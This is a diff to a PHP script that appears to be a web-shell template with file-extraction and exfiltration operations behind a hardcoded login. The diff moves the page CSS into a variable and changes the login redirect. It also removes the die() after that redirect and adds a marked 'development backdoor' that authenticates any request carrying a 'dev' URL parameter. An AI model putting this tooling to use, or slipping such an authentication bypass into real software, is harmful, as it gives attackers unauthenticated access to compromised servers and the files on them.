@@ -88,6 +88,8 @@ $ENABLED_FEATURES = array(
 
 date_default_timezone_set("UTC");
 
+$CSS = '__CSS__';
+
 ////////////////////////
 /// UTILITY FUNCTIONS //
 ////////////////////////
@@ -354,7 +356,7 @@ function makeForm($operation, $action, $elements, $method = "post") {
  * @return string
  */
 function makePage($elements, $current_page) {
-    global $ENABLED_FEATURES;
+    global $ENABLED_FEATURES, $CSS;
     if ($_SESSION["auth"] !== true) {
         header("Location: ?page=" . LOGIN);
         die();
@@ -365,7 +367,7 @@ function makePage($elements, $current_page) {
     <html lang="en">
     <head>
         <title>__TITLE__</title>
-        <style>__CSS__</style>
+        <style><?php echo $CSS ?></style>
         <script>__JS__</script>
     </head>
     <body class="bg-white">
@@ -410,12 +412,13 @@ function makePage($elements, $current_page) {
  * @return string
  */
 function makeLoginPage() {
+    global $CSS;
     ob_start();
     ?>
     <html lang="en" class="h-full bg-zinc-900">
     <head>
         <title>__TITLE__</title>
-        <style>__CSS__</style>
+        <style><?php echo $CSS ?></style>
         <script>__JS__</script>
     </head>
     <body class="h-full">
@@ -1030,16 +1033,24 @@ function handleLogin() {
 
     if ($username === USERNAME && $password === PASSWORD) {
         $_SESSION["auth"] = true;
-        header("Location: ?page=" . FILE_EXTRACTION);
-        die(0);
+        header("Location: ?page=" . FILE_EXTRACTION, true, 301);
     }
 }
+
+// TEMPLATE DEVELOPMENT BACKDOOR - START
+// The following snippet is a backdoor that allows for template development without the need to authenticate.
+// This should be removed before deploying the template to a production environment.
+if (isset($_GET["dev"])) {
+    $_SESSION["auth"] = true;
+}
+// TEMPLATE DEVELOPMENT BACKDOOR - END
 
 // Define a list of operations that must be run in an isolated environment meaning no other content should be rendered
 // on the page except the operation result.
 $isolated_ops = array(
     FILE_EXTRACTION,
     EXFILTRATE,
+    LOGIN,
 );
 
 // Check if the request is not POST and the operation is not in the isolated operations list, then render the page
